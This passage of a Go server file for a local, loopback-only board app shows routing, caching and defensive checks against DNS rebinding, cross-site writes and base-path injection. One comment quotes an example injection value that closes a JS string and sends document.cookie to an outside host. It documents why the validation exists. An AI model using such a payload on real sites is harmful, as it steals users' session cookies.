// server.go — the HTTP surface.
//
//	GET  /             aboard.html, with the base path injected
//	GET  /aboard.json   current state
//	POST /aboard.json   write state to disk (compare-and-set)
//	GET  /events       SSE stream; pings whenever the state file changes on disk
//	GET  /wait         block until the board is poked (wait.go)
//	POST /poke         release every session waiting on this board (wait.go)
//	GET  /waiters      who is waiting right now (wait.go)
//	GET  /capabilities what this board can do, from views/*.spec.json (caps.go)
//	GET  /journal      recent accepted writes (journal.go)
//	GET  /history      one tab's recorded prior states (history.go)
//	POST /rendered     a mount receipt from the browser (receipts.go)
//	GET  /watch        those writes as JSON lines, as they happen (journal.go)
//	POST /log          append output to a tab's sidecar log (logs.go)
//	GET  /log          the tail of one (logs.go)
//	POST /upload       an image pasted or dropped by the human (upload.go)
//	GET  /uploads/<f>  serve one, from disk — uploads arrive after the build
//	GET  /<file>       static assets (views/, lib/, assets/, test/, app.css)
//
// The UI is compiled into the binary (pkg/aboard/web), so shipping the board is
// copying one file. The state file is deliberately NOT embedded: it is the
// shared document that both the browser and Claude Code read and write on disk.
//
// The file watcher polls a content hash rather than using an OS watcher. That
// keeps the dependency list to cobra and, unlike a single-file watch, it survives
// an editor that saves by rename.

package aboard

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/fs"
	"math"
	"math/rand/v2"
	"mime"
	"net"
	"net/http"
	"os"
	"path"
	"regexp"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	jsonv2 "github.com/go-json-experiment/json"
	"github.com/go-json-experiment/json/jsontext"

	"github.com/exoport/aboard/pkg/aboard/web"
)

// maxBodyBytes is the ceiling on a POSTed document. 32 MiB, raised from 8 once
// the write path stopped costing a multiple of the document (see document.go).
//
// The number is a judgement, not a measurement, so here is the reasoning. Below
// it: MaxBytesReader refuses the body before any parser runs, so the ceiling is
// what a board can GROW to, and a board that hits it is bricked for writes — the
// browser cannot save, `apply` cannot land, and the only way out is editing the
// file by hand. Above it: every request is read fully into memory before it is
// parsed, so the ceiling is also what one hostile or buggy POST can make this
// process allocate. 32 MiB is roughly a hundred times the largest real board
// anyone has (135 KB), leaves room for the pasted-widget and annotated-screenshot
// tabs that actually make a board big, and is still small enough that the process
// holding one in memory is unremarkable.
//
// It is deliberately NOT unbounded. Uploads have their own, lower limit (12 MiB,
// see upload.go) because an image is not a document.
const maxBodyBytes = 32 << 20 // 32 MiB

var (
	serveDirs  = []string{"views", "lib", "assets", "test"}
	serveFiles = []string{"app.css", "aboard.html"}
)

// WebFS is the embedded web tree. Exported so a host can serve the same assets,
// and so `--dev` has something to be an alternative TO.
func WebFS() fs.FS { return web.FS }

// Instance describes a running board. It is written under `.aboard/run/` so
// restart.sh can stop exactly this project's board (not every board on the
// machine), and so an agent can find the URL without being told.
type Instance struct {
	// App is the identity of the process serving: HostStandalone or HostApe.
	// A client uses it to recognise a board on a port; it is deliberately NOT
	// AppName, which describes the board rather than its host.
	App     string `json:"app"`
	Host    string `json:"host"`
	Argv0   string `json:"argv0,omitempty"`
	Version string `json:"version"`
	Built   string `json:"built,omitempty"`
	Project string `json:"project"`
	Name    string `json:"name,omitempty"`
	Port    int    `json:"port"`
	URL     string `json:"url"`
	// Base is the URL prefix the board is served under, "" for the server root.
	Base  string `json:"base,omitempty"`
	State string `json:"state"`
	PID   int    `json:"pid"`

	Started string `json:"started"`
}

// ServeConfig is everything `aboard serve` decided before the engine starts.
type ServeConfig struct {
	Root Root
	Name string
	// StateFile overrides Root.StateFile(Name) when non-empty.
	StateFile string
	Port      int
	Dev       bool
	// DevDir is the web tree to serve under Dev; empty means Root.DevDir().
	DevDir string
	// BasePath is a URL prefix such as "/aboard", or "" for the server root.
	BasePath string
}

type server struct {
	opts      Options
	root      Root
	stateFile string
	assets    fs.FS
	dev       bool
	port      int
	base      string
	instance  Instance

	mu       sync.Mutex
	clients  map[chan string]struct{}
	watchers map[chan string]struct{} // `aboard watch` consumers (journal.go)

	// writeMu serialises the whole read → compare-and-set → reconcile → write
	// span of a POST (see commitState). A SEPARATE lock from s.mu on purpose:
	// s.mu guards the two subscriber maps, which every broadcast touches, and
	// reusing it here would park every SSE frame behind a disk write. They also
	// nest in one direction only — writeMu may be held while taking s.mu, never
	// the reverse — which is what keeps the pair deadlock-free.
	writeMu sync.Mutex

	// Sessions blocked on /wait, released by the human's notify button or by
	// another session's poke (see wait.go).
	waits *waitHub

	// Signature of the UI being served, so an open page can notice its own code
	// changed and reload itself (see reload.go).
	ui *uiWatcher

	// Append-only record of every accepted write (see journal.go).
	journal *journal

	// What the BROWSER reports it drew, per tab. A sidecar under run/, never the
	// state document — per-viewer state (see receipts.go).
	receipts *receiptStore

	// The state file as this process holds it: the bytes, their ETag, and the
	// parsed document. Replaced on every accepted write and whenever the file is
	// found to have moved underneath us. Atomic because a reader takes it without
	// any lock at all — see liveDoc.
	live atomic.Pointer[liveDoc]

	// Signature of the state file as the watcher last hashed it, with the stat
	// that produced it. Only the watcher goroutine touches these.
	sig      string
	sigStamp fileStamp

	// Set by a POST so the browser that made the write can recognise the echo
	// of its own change and skip reloading. Cleared on every broadcast.
	pendingOrigin string

	// The write warnings of that same POST, so an open page learns about a
	// FOREIGN write that set state no renderer reads. The writer's own copy comes
	// back in the POST reply; this is the other half, and it is the half the
	// feature exists for — an agent's `apply` warns on a terminal the human is
	// not looking at.
	//
	// Best-effort, exactly like pendingOrigin beside it, and for the same reason:
	// the watcher coalesces, so two writes inside one 200 ms tick publish the
	// second one's warnings and not the first's. The RECORD is the journal, which
	// misses nothing; this is a notice.
	pendingWarnings map[string][]string

	// The tabs that write CHECKED — the ones it changed — whether or not any of
	// them warned. Sent beside the warnings, and the banner needs it: it says
	// "the last write to this tab", so a page holding a warning has to be told
	// when a later write to the same tab came back clean. Without it the sentence
	// outlives the mistake, and the human is left looking at a warning about a
	// tree the agent has already fixed — the same disagreement between the two of
	// them that the warnings exist to end, only pointing the other way.
	pendingChecked []string

	// The renderer declarations, read once from the assets this server serves.
	// The write path asks for them on every accepted write, and re-reading and
	// re-parsing fifteen spec files per write would be the same mistake
	// document.go exists to undo. Read once and kept: under `--dev` the tree is
	// on disk and a spec edit therefore needs a restart to reach these checks,
	// which is the same restart `make caps` already needs to move the manifest.
	specsOnce sync.Once
	specTypes map[string]typeSpec
}

// specs is the type declarations the write-warning checker reads, memoised.
func (s *server) specs() map[string]typeSpec {
	s.specsOnce.Do(func() {
		byType, err := specsByType(s.assets)
		if err != nil {
			// A board that cannot read its own declarations still has to accept
			// writes. No specs means no warnings, which is what this checker has
			// always done on an unreadable spec directory.
			s.opts.Log().Printf("write warnings are off: cannot read the view declarations: %v", err)
			byType = map[string]typeSpec{}
		}
		s.specTypes = byType
	})
	return s.specTypes
}

// NormalizeBasePath reduces a --base-path to the one form the router and the
// browser both expect: empty, or a leading slash with no trailing one.
//
// Both ends have to agree exactly, and the failure when they do not is a blank
// page with a 404 in a console nobody opened — so the normalisation is a named
// function with a test rather than a regexp repeated at two call sites.
func NormalizeBasePath(raw string) string {
	trimmed := strings.Trim(strings.TrimSpace(raw), "/")
	if trimmed == "" {
		return ""
	}
	return "/" + trimmed
}

// basePathRe is what a URL prefix may contain: one or more `/segment`, each
// segment made of the characters a path segment can hold without being escaped.
// A segment must contain at least one character that is not a dot, so `.` and
// `..` are refused — dots are in the class because `v1.2` is a reasonable
// prefix, and that is exactly what lets `..` through if nothing says otherwise.
var basePathRe = regexp.MustCompile(`^(/[A-Za-z0-9._~-]*[A-Za-z0-9_~-][A-Za-z0-9._~-]*)+$`)

// ValidateBasePath refuses a --base-path that cannot be one.
//
// This is not hygiene. `serveShell` splices the normalised value into the shell
// as `window.ABOARD_BASE = "<base>";` — inside a JS STRING LITERAL — and
// NormalizeBasePath only trimmed slashes, so a `"` closed the literal and
// everything after it ran on the board's own origin:
//
//	--base-path '/brd";fetch("http://elsewhere/?"+document.cookie)//'
//
// The flag belongs to whoever starts the server, so this is not a route in from
// outside; it is the shape of thing that becomes one the moment a wrapper builds
// the flag from something it read. Refused up front, as ValidateBoardName is,
// rather than escaped at the splice: a base path with a quote in it is not a
// base path, and there is exactly one place that decides so.
//
// `..` is refused by the same rule, since a segment of dots is not in the
// character class. A prefix containing `..` is not a traversal — the router
// strips it as a literal — but it is nonsense that would have to be explained.
func ValidateBasePath(raw string) error {
	base := NormalizeBasePath(raw)
	if base == "" {
		return nil
	}
	if !basePathRe.MatchString(base) {
		return fmt.Errorf("base path %q is not usable: it must be one or more /segments of letters, digits, %s",
			raw, "dot, underscore, tilde or hyphen, and no segment may be `.` or `..` — for example /aboard")
	}
	return nil
}

// Serve runs the board until the context is cancelled or the server fails.
//
// Everything it needs is in cfg and opts: it reads no flags, no environment and
// no os.Args, which is what lets ape mount the same call behind its own command.
func Serve(ctx context.Context, opts Options, cfg ServeConfig) error {
	logger := opts.Log()

	// Before anything binds or is written: an unusable base path would otherwise
	// reach serveShell's splice.
	if err := ValidateBasePath(cfg.BasePath); err != nil {
		return err
	}

	stateFile := cfg.StateFile
	if stateFile == "" {
		stateFile = cfg.Root.StateFile(cfg.Name)
	}
	if _, err := os.Stat(stateFile); err != nil {
		// Naming the path it looked for AND the command that creates it. The
		// commonest cause is a project that has a `.aboard/` but no document in
		// it, and "no such file" without the path sends the reader to grep the
		// source; a path without a command sends them to write the JSON by hand,
		// which is how a document with the wrong `version` gets into a board.
		hint := "aboard init"
		if cfg.Name != "" {
			hint += " --name " + cfg.Name
		}
		return fmt.Errorf("no board document at %s — run `%s` in %s", stateFile, hint, cfg.Root)
	}

	// .js must be text/javascript or the browser refuses the ES modules; some
	// systems' /etc/mime.types disagree, so state it rather than inherit it.
	for ext, typ := range map[string]string{
		".js":   "text/javascript; charset=utf-8",
		".mjs":  "text/javascript; charset=utf-8",
		".css":  "text/css; charset=utf-8",
		".html": "text/html; charset=utf-8",
		".svg":  "image/svg+xml",
		".json": "application/json",
	} {
		if err := mime.AddExtensionType(ext, typ); err != nil {
			logger.Printf("mime %s: %v", ext, err)
		}
	}

	var assets fs.FS = web.FS
	if cfg.Dev {
		dir := cfg.DevDir
		if dir == "" {
			dir = cfg.Root.DevDir()
		}
		// --dev-dir names a tree that need not be under the project root at all,
		// so Root has no opinion about it — but the join still goes through
		// layout.go, which is the only file that joins a path. Probing for
		// aboard.html turns "--dev silently served nothing" into a message that
		// names the directory it looked in.
		if _, err := os.Stat(DevWebFile(dir, "aboard.html")); err != nil {
			return fmt.Errorf("--dev found no web tree at %s (pass --dev-dir)", dir)
		}
		assets = os.DirFS(dir)
	}

	srv := &server{
		opts:      opts,
		root:      cfg.Root,
		stateFile: stateFile,
		assets:    assets,
		dev:       cfg.Dev,
		base:      NormalizeBasePath(cfg.BasePath),
		clients:   map[chan string]struct{}{},
		watchers:  map[chan string]struct{}{},
		waits:     newWaitHub(),
		ui:        newUIWatcher(cfg.Dev),
		journal:   newJournal(cfg.Root),
		receipts:  newReceiptStore(cfg.Root),
	}

	listener, chosen, err := srv.listen(ctx, cfg.Port, cfg.Root, cfg.Name)
	if err != nil {
		return err
	}

	srv.port = chosen
	if err := srv.writeInstance(cfg.Root, cfg.Name); err != nil {
		logger.Printf("warning: could not record the instance file: %v", err)
	}
	defer srv.removeInstance()

	go srv.guard("state watcher", srv.watch)
	go srv.guard("ui watcher", srv.watchUI)

	mux := http.NewServeMux()
	mux.HandleFunc("/", srv.route)

	mode := "embedded UI"
	if cfg.Dev {
		mode = "UI from disk (dev)"
	}
	label := ""
	if cfg.Name != "" {
		label = "  [" + cfg.Name + "]"
	}
	logger.Printf("aboard  ->  %s%s   (%s, %s)", srv.instance.URL, label, mode, VersionString())
	logger.Printf("state  ->  %s", srv.stateFile)
	logger.Printf("project->  %s", cfg.Root)
	logger.Printf(`In VS Code: Ctrl/Cmd+Shift+P -> "Simple Browser: Show" -> paste the URL above.`)

	httpSrv := &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 10 * time.Second,
	}

	// Remove the instance file on Ctrl-C too, not only on a clean return, so a
	// stale record never points at a dead process. The context is the cli
	// layer's signal-cancelled one.
	done := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			srv.removeInstance()
			_ = httpSrv.Close()
		case <-done:
		}
	}()
	defer close(done)

	if err := httpSrv.Serve(listener); err != nil && !errors.Is(err, http.ErrServerClosed) {
		return err
	}
	return nil
}

// listen binds the project's port. An explicit port is taken literally. Port 0
// means "derive one from the project root", then walk forward if that exact port
// is already busy — but if the occupant turns out to be this project's own
// board, say so and stop instead of starting a duplicate.
//
// Duplicate detection runs FIRST, whichever way the port was chosen. It used to
// live only in the derive-and-walk loop, so `--port` (and `PORT`) skipped it
// entirely: a second server started happily on the same state file, rewrote
// `instance.json` to point at itself, and killing it left every client command
// aimed at a dead port while a perfectly healthy board went on serving. The
// duplicate is the thing being prevented, and the duplicate does not care how
// its port was picked — the check belongs to the project, not to the branch.
func (s *server) listen(ctx context.Context, want int, root Root, name string) (net.Listener, int, error) {
	var lc net.ListenConfig
	if want != 0 {
		if err := s.refuseDuplicate(ctx, root, name, want); err != nil {
			return nil, 0, err
		}
		ln, err := lc.Listen(ctx, "tcp", fmt.Sprintf("127.0.0.1:%d", want))
		if err != nil {
			return nil, 0, fmt.Errorf("port %d is busy: %w", want, err)
		}
		return ln, want, nil
	}

	first := DerivePort(root, name)
	for i := range portTries {
		p := portBase + ((first - portBase + i) % portSpan)
		ln, err := lc.Listen(ctx, "tcp", fmt.Sprintf("127.0.0.1:%d", p))
		if err == nil {
			return ln, p, nil
		}
		if err := s.refuseDuplicate(ctx, root, name, p); err != nil {
			return nil, 0, err
		}
		s.opts.Log().Printf("port %d busy, trying %d", p, portBase+((first-portBase+i+1)%portSpan))
	}
	return nil, 0, fmt.Errorf("no free port found in %d-%d after %d tries", portBase, portBase+portSpan-1, portTries)
}

// refuseDuplicate reports an error when THIS project's board already holds the
// port, and nothing otherwise — a stranger on the port is somebody else's
// business, and on the derived path the loop walks past it.
func (s *server) refuseDuplicate(ctx context.Context, root Root, name string, port int) error {
	other := probeOccupant(ctx, root, name, port)
	if other == nil || other.Project != root.String() || other.Name != name {
		return nil
	}
	return fmt.Errorf("this project's board is already running at %s (pid %d)", other.URL, other.PID)
}

// What a probe will spend on an occupant that may not be a board at all: a
// local connection either answers in well under this or is not listening, and
// the reply is a one-line instance record.
const (
	probeTimeout   = 400 * time.Millisecond
	probeReadLimit = 4 << 10
)

// ProbeBoard asks whoever holds a port whether they are a board, and whose.
//
// It accepts EITHER identity, because a project's board may have been started by
// the standalone binary or by ape and a client has no way to know which — and
// the point of the probe is to recognise a board, not to police who launched it.
//
// base is the URL prefix the occupant is served under, "" for the server root.
// It is a parameter and not an assumption because a board started with
// --base-path answers at <base>/health and NOWHERE else: probing the bare root
// made `aboard status` report a live prefixed board as a stale record, which is
// the one sentence that sends a session off to restart a healthy server.
func ProbeBoard(ctx context.Context, port int, base string) *Instance {
	client := &http.Client{Timeout: probeTimeout}
	url := fmt.Sprintf("http://127.0.0.1:%d%s/health", port, NormalizeBasePath(base))
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, http.NoBody)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	var got Instance
	if json.NewDecoder(io.LimitReader(resp.Body, probeReadLimit)).Decode(&got) != nil {
		return nil
	}
	if got.App != HostStandalone && got.App != HostApe {
		return nil
	}
	return &got
}

// probeOccupant asks who holds a port when this project wants it, and is the
// only caller that has to GUESS a base path: the bare root is tried first, and
// then — only if this project has a record on that very port — the base that
// record names. Without the second try a prefixed board fails to recognise
// ITSELF on restart and quietly starts a duplicate one port along, which is the
// exact failure the recognition exists to prevent.
func probeOccupant(ctx context.Context, root Root, name string, port int) *Instance {
	if inst := ProbeBoard(ctx, port, ""); inst != nil {
		return inst
	}
	rec, err := RunningInstance(root, name)
	if err != nil || rec.Port != port || rec.Base == "" {
		return nil
	}
	return ProbeBoard(ctx, port, rec.Base)
}

func (s *server) writeInstance(root Root, name string) error {
	if err := os.MkdirAll(root.RunDir(), 0o755); err != nil {
		return err
	}
	s.instance = Instance{
		App:     s.opts.HostID(),
		Host:    s.opts.HostID(),
		Argv0:   s.opts.Argv0,
		Version: VersionString(),
		Built:   BuildStamp(),
		Project: root.String(),
		Name:    name,
		Port:    s.port,
		URL:     fmt.Sprintf("http://localhost:%d%s", s.port, s.base),
		Base:    s.base,
		State:   s.stateFile,
		PID:     os.Getpid(),
		Started: time.Now().UTC().Format(time.RFC3339),
	}
	body, err := json.MarshalIndent(s.instance, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(root.InstanceFile(name), append(body, '\n'), 0o644) //nolint:gosec // 0o644 is the board's repo-wide file-mode policy; see the note in init.go
}

func (s *server) removeInstance() {
	// Only clear the record if it is still ours, so a restart that already
	// overwrote it is not undone by this process exiting afterwards.
	p := s.root.InstanceFile(s.instance.Name)
	body, err := os.ReadFile(p)
	if err != nil {
		return
	}
	var got Instance
	if json.Unmarshal(body, &got) == nil && got.PID != os.Getpid() {
		return
	}
	_ = os.Remove(p)
}

// RunningInstance finds the board every client-side command talks to. One
// lookup, so they all fail the same recognisable way when nothing is running.
func RunningInstance(root Root, name string) (Instance, error) {
	var inst Instance
	p := root.InstanceFile(name)
	rec, err := os.ReadFile(p)
	if err != nil {
		return inst, fmt.Errorf("no running board found (%s); start it with `aboard serve`", p)
	}
	if err := json.Unmarshal(rec, &inst); err != nil {
		return inst, fmt.Errorf("unreadable instance file %s", p)
	}
	return inst, nil
}

/* ---------- routing ---------- */

// The board has no authentication: anything that can reach the port can read and
// rewrite the whole board. Loopback-only binding is the containment, and these
// two checks are what stop a BROWSER from being the thing that reaches it on an
// attacker's behalf.
//
// hostAllowed is the DNS-rebinding guard. The bind is 127.0.0.1, but a name that
// resolves to 127.0.0.1 reaches it just as well, and a page served from that name
// is then SAME-ORIGIN with the board: it can read `/aboard.json`, `/journal` and
// `/health`, which discloses the absolute project path and the pid. The Host
// header is the only thing that distinguishes the two, so it is checked before
// anything else looks at the request.
//
// The allow-list is the three spellings of loopback, with or without a port. A
// name is NOT accepted just because it resolves to loopback — that is exactly the
// attack — and there is deliberately no flag to widen it: a board reached under
// another name is a board that has left the machine it was designed for.
func hostAllowed(raw string) bool {
	if raw == "" {
		return false
	}
	host := raw
	if h, _, err := net.SplitHostPort(raw); err == nil {
		host = h
	}
	host = strings.TrimSuffix(strings.TrimPrefix(host, "["), "]")
	switch strings.ToLower(host) {
	case "localhost", "127.0.0.1", "::1":
		return true
	}
	return false
}

// mutating reports that this request would change something, so it has to prove
// it did not come from another site.
func mutating(method string) bool {
	switch method {
	case http.MethodGet, http.MethodHead, http.MethodOptions:
		return false
	}
	return true
}

// crossSite decides whether a mutating request came from somewhere else, and
// says which signal refused it.
//
// Two signals, because neither alone is enough. `Sec-Fetch-Site: cross-site` is
// the browser's own account of where the request came from and it cannot be set
// by page script; `Origin` catches the browsers and the versions that do not send
// the fetch-metadata headers. Both are absent from curl and from `apply`, and
// that is the case that must keep working: this is not authentication — the
// server has none and cannot have any — it is a same-origin rule for the one
// client that lies about who it is acting for.
//
// What passes: `same-origin`, `same-site`, `none` (a user typing the URL), no
// header at all, and an `Origin` that is this server's own. What is refused: a
// page on another origin POSTing to the board, which was reproduced in headless
// Chromium wiping the board from a different local port.
func crossSite(r *http.Request) string {
	if r.Header.Get("Sec-Fetch-Site") == "cross-site" {
		return "Sec-Fetch-Site: cross-site"
	}
	origin := r.Header.Get("Origin")
	switch origin {
	case "":
		// curl, `apply`, any non-browser client. Nothing to check and nothing to
		// gain by demanding one: a program that wanted to lie could send any
		// value at all. The signal is only worth anything from a browser, which
		// sets it itself.
		return ""
	case "http://" + r.Host, "https://" + r.Host:
		return ""
	}
	// `null` lands here too, and deliberately: an opaque origin is a sandboxed
	// frame or a data: URL, and neither is this board's own page. The html tab
	// frames are exactly that shape, and they reach the board through
	// postMessage to the parent, never with a request of their own.
	return "Origin: " + origin
}

func (s *server) route(w http.ResponseWriter, r *http.Request) {
	if !hostAllowed(r.Host) {
		// 403 rather than 421. 421 says "I am not the right server for this
		// authority", which invites a client to retry on a fresh connection —
		// and a browser following that advice would hammer the board. This is a
		// deliberate refusal, not a misdirection, so it says so.
		http.Error(w, "refused: this board answers only on localhost, 127.0.0.1 or [::1] — "+
			"a hostname that merely resolves to loopback is how a page on another site reads a local board", http.StatusForbidden)
		return
	}
	if mutating(r.Method) {
		if why := crossSite(r); why != "" {
			http.Error(w, "refused: this write did not come from the board's own page ("+why+") — "+
				"the board has no authentication, so a cross-site write is refused rather than trusted", http.StatusForbidden)
			return
		}
	}

	// Strip the base path before anything looks at the path, so every case below
	// is written against the server root and there is one place that knows a
	// prefix exists at all.
	upath := r.URL.Path
	if s.base != "" {
		switch {
		case upath == s.base:
			// Without the trailing slash every relative URL in the shell — the
			// stylesheet, the module imports — would resolve one level too high.
			http.Redirect(w, r, s.base+"/", http.StatusMovedPermanently)
			return
		case strings.HasPrefix(upath, s.base+"/"):
			upath = strings.TrimPrefix(upath, s.base)
		default:
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
	}

	if s.routeAPI(w, r, upath) {
		return
	}
	s.routeUI(w, r, upath)
}

// routeAPI handles the endpoints something other than a browser page talks to:
// the state document, the notify channel, the journal, the log sink, uploads.
// It reports whether it recognised the path, so route can fall through to the
// UI half rather than 404 twice.
//
// Split from routeUI because one switch carrying both measured 40 branches, and
// the two halves have different rules: everything here answers a client and
// names its method, everything there serves a file to a page.
//
// Split AGAIN, into the document-and-notify half here and the record half in
// routeRecords, when /history and /rendered took the branch count past the
// complexity gate. The line between the two is real rather than a way of pleasing
// a linter: everything below answers about the board AS IT IS, everything in
// routeRecords answers from a sidecar under run/ that is not the board at all.
func (s *server) routeAPI(w http.ResponseWriter, r *http.Request, upath string) bool {
	switch {
	case upath == routeState && r.Method == http.MethodGet:
		s.getState(w, r)
	case upath == routeState && r.Method == http.MethodPost:
		s.postState(w, r)
	case upath == "/health" && r.Method == http.MethodGet:
		s.writeJSON(w, http.StatusOK, s.instance)
	case upath == "/events" && r.Method == http.MethodGet:
		s.events(w, r)
	case upath == "/wait" && r.Method == http.MethodGet:
		s.handleWait(w, r)
	case upath == "/poke" && r.Method == http.MethodPost:
		s.handlePoke(w, r)
	case upath == "/waiters" && r.Method == http.MethodGet:
		s.handleWaiters(w, r)
	case upath == "/capabilities" && r.Method == http.MethodGet:
		s.handleCapabilities(w, r)
	case upath == "/upload" && r.Method == http.MethodPost:
		s.handleUpload(w, r)
	case upath == "/uploads" && r.Method == http.MethodGet:
		s.handleUploads(w, r)
	default:
		return s.routeRecords(w, r, upath)
	}
	return true
}

// routeRecords serves what is written BESIDE the board: the journal and the
// per-tab history read out of it, the change stream, the sidecar logs, and the
// mount receipts. None of it is in .aboard/aboard.json and none of it is the
// board — which is the same distinction the layout draws between content and
// run/, kept here so the two halves of the API do not have to be read as one.
func (s *server) routeRecords(w http.ResponseWriter, r *http.Request, upath string) bool {
	switch {
	case upath == "/journal" && r.Method == http.MethodGet:
		s.handleJournal(w, r)
	case upath == "/history" && r.Method == http.MethodGet:
		s.handleHistory(w, r)
	case upath == "/watch" && r.Method == http.MethodGet:
		s.handleWatch(w, r)
	case upath == "/rendered" && r.Method == http.MethodPost:
		s.handleRendered(w, r)
	case upath == routeLog && r.Method == http.MethodPost:
		s.handleLogPost(w, r)
	case upath == routeLog && r.Method == http.MethodGet:
		s.handleLogGet(w, r)
	default:
		return false
	}
	return true
}

// routeUI serves what a page asks for: the shell, an html tab's sandboxed
// frame, an uploaded image, and the embedded (or --dev on-disk) assets.
func (s *server) routeUI(w http.ResponseWriter, r *http.Request, upath string) {
	switch {
	// GET, like every other case here. It had no method check at all, so
	// `POST /` returned the whole shell with a 200 — harmless, since nothing in
	// the browser executes anything, but it made the reference's "any method not
	// listed for a matched path is 404" false, and a rule with a known exception
	// is one nobody trusts the rest of.
	case (upath == "/" || upath == "/aboard.html") && r.Method == http.MethodGet:
		s.serveShell(w, r)
	case strings.HasPrefix(upath, "/tab/") && strings.HasSuffix(upath, "/html") && r.Method == http.MethodGet:
		id := strings.TrimSuffix(strings.TrimPrefix(upath, "/tab/"), "/html")
		s.serveTabHTML(w, r, id)
	case strings.HasPrefix(upath, "/"+uploadDir+"/") && r.Method == http.MethodGet:
		s.serveUpload(w, strings.TrimPrefix(upath, "/"+uploadDir+"/"))
	case r.Method == http.MethodGet:
		s.static(w, r, upath)
	default:
		http.Error(w, "not found", http.StatusNotFound)
	}
}

/* ---------- state ---------- */

// liveDoc is the state file as this process holds it: the exact bytes, their
// entity tag, the stat that produced them, and — for the write path — the parsed
// document.
//
// `doc` is nil for a cache built by a READER, which needs the bytes and nothing
// else. The write path is the only thing that dereferences it and it does so
// under writeMu, so nothing here is shared mutable state; the pointer itself is
// swapped atomically, and a reader always holds a consistent snapshot because a
// liveDoc is never modified after it is published.
type liveDoc struct {
	doc   *stateDoc
	disk  []byte
	etag  string
	stamp fileStamp
}

// fileStamp is what a stat can tell us cheaply: enough to know the file has NOT
// moved, never enough to prove it has not changed. Comparable, so it is one `==`.
type fileStamp struct {
	size  int64
	mtime int64
}

func stampOf(info os.FileInfo) fileStamp {
	if info == nil {
		return fileStamp{}
	}
	return fileStamp{size: info.Size(), mtime: info.ModTime().UnixNano()}
}

// usable says the stamp came from a file we actually saw. The zero value is the
// deliberate "do not trust this" marker readStable returns when it could not
// pin the bytes to a stat, and it must never compare equal to a real one — an
// mtime of exactly the epoch is not a thing this file will have.
func (f fileStamp) usable() bool { return f.mtime != 0 }

// readStable reads the state file and returns a stamp that describes THE BYTES
// IT GOT, which a stat on either side of the read on its own does not.
//
// This is not fussiness. The state file is replaced by rename (writeAtomic), so
// a reader that opened the old inode reads the old bytes in full while the path
// already names the new file — and a stat taken after that read describes the
// NEW file. Caching those bytes under that stamp pins them: every later request
// stats, matches, and is served the superseded document, for as long as nothing
// else moves the file. Not 200 ms stale and corrected by the next frame, which
// is the trade this cache was argued for — permanently stale, ETag and all, so
// the browser's revalidation answers 304 on a board that no longer exists.
// Reproduced with a rename storm under a concurrent reader before it was fixed.
//
// So: stat, read, stat, and only believe the stamp when the two agree. A file
// being rewritten faster than it can be read gives up and returns the bytes with
// an UNUSABLE stamp, which costs a re-read on the next request and cannot lie.
func readStable(file string) ([]byte, fileStamp, error) {
	var raw []byte
	for range 3 {
		before, err := os.Stat(file)
		if err != nil {
			return nil, fileStamp{}, err
		}
		raw, err = os.ReadFile(file)
		if err != nil {
			return nil, fileStamp{}, err
		}
		after, err := os.Stat(file)
		if err != nil {
			return nil, fileStamp{}, err
		}
		if stamp := stampOf(before); stamp == stampOf(after) {
			return raw, stamp, nil
		}
	}
	return raw, fileStamp{}, nil
}

// cachedState is the document a READER gets: served from memory when the file
// has not moved, re-read when it has.
//
// Gated on stat rather than on content, which is the right trade for a read: a
// GET that served bytes one poll interval stale is corrected by the very next
// SSE frame, and the alternative is re-reading megabytes on every request from
// every open page. The WRITE path does not settle for this — see currentLocked.
//
// The bytes and the stamp come from readStable, together, because the bound on
// the staleness is the whole argument for the trade and a stamp taken after the
// read does not deliver it — see there.
func (s *server) cachedState() (*liveDoc, error) {
	info, err := os.Stat(s.stateFile)
	if err != nil {
		return nil, err
	}
	// Loaded BEFORE the read, so the swap below can tell "nobody published while
	// we were reading" from "the write path published the document it just
	// wrote" — and never overwrite the second with our older copy.
	prev := s.live.Load()
	if stamp := stampOf(info); prev != nil && stamp.usable() && prev.stamp == stamp {
		return prev, nil
	}

	raw, stamp, err := readStable(s.stateFile)
	if err != nil {
		return nil, err
	}
	live := &liveDoc{disk: raw, etag: etagOf(raw), stamp: stamp}
	if !s.live.CompareAndSwap(prev, live) {
		// Somebody got there first, and the only other publisher is the write
		// path with the bytes it has just written. Theirs is at least as fresh as
		// ours; take it and leave the cache alone.
		if newer := s.live.Load(); newer != nil {
			return newer, nil
		}
	}
	return live, nil
}

// currentLocked is the document the WRITE path compares against, and it is
// deliberately stricter than cachedState: it re-reads the file every time and
// only reuses the parse when the bytes are identical.
//
// The read is what makes this airtight. A stat-gated cache has a window — an
// external editor writing the same number of bytes inside one mtime tick — and on
// the write path that window means silently reconciling against a document that
// no longer exists and writing the other person's edit away. Reading 3.5 MB costs
// ~0.6 ms and comparing it ~0.2 ms, against the ~30 ms the parse it avoids costs
// and the several ms the write that follows will spend; buying certainty at that
// price is not a trade worth thinking about twice.
//
// An unreadable document on disk is refused rather than treated as an empty
// board, exactly as reconcileTabs used to refuse it: writing a fresh document
// over a corrupt one would destroy whatever could still have been recovered from
// it by hand.
func (s *server) currentLocked() (*liveDoc, error) {
	raw, stamp, err := readStable(s.stateFile)
	if err != nil {
		// A file that is not there is a board nobody has written yet, and the
		// first POST against a fresh root has to be allowed to create it.
		//
		// A file that IS there and cannot be read is a different sentence, and
		// calling it an empty board is how a write replaces a board this process
		// merely failed to open: the guarantees restore a dropped tab from the
		// CURRENT document, and an empty current document has nothing to restore,
		// so every tab the caller happened to omit would go silently. Refused for
		// the same reason an unparseable document is — the error was swallowed
		// here, and the comment below already claimed it was not.
		if !errors.Is(err, fs.ErrNotExist) {
			return nil, fmt.Errorf("current board unreadable: %w", err)
		}
		raw, stamp = nil, fileStamp{}
	}
	if live := s.live.Load(); live != nil && live.doc != nil && bytes.Equal(live.disk, raw) {
		return live, nil
	}
	doc, err := decodeDocument(raw)
	if err != nil {
		return nil, fmt.Errorf("current board unreadable: %w", err)
	}
